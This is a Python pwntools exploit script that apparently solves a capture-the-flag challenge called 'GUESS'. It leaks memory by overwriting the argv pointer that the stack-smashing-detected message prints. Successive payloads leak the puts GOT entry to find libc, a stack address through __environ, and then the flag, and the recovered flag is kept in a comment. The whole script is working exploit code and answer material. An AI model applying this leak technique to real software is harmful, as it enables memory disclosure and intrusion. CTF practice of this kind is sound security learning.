#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25734
elfpath = 'GUESS'
ldpath = ''
libcpath = 'libc.so.6'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
# 第一次碰到有fork的pwn题，学习一波
'''
use __stack_chk_fail to leak
'''

e = ELF(elfpath)
tip = b'Please type your guessing flag\n'
smash = b'*** stack smashing detected ***: '
ru(tip)
sl(b'a' * 0x128 + p64(e.got['puts']))
ru(smash)
puts_addr = u64(ru7f()[-6:]+b'\x00'*2)
# from LibcSearcher import *
# libc = LibcSearcher('puts', puts_addr)
# su(hex(puts_addr))
# print(libc)
# for l in libc:
#     print(l)
libc = ELF(libcpath)
libc_base = puts_addr - libc.sym['puts']

environ_addr = libc_base + libc.sym['__environ']
# su(hex(environ_addr) + hex(libc_base))
payload2 = b'a' * 0x128 + p64(environ_addr)
ru(tip)
sl(payload2) # leak stack address
ru(smash)
stack_addr = u64(ru7f()[-6:]+b'\x00'*2)

flag_addr = stack_addr - 0x168
payload3 = b'a'*0x128 + p64(flag_addr)
ru(tip)
sl(payload3) # leak stack address
# flag{7fe163db-7a18-4380-8a18-269cd4d3e37c}

shell()


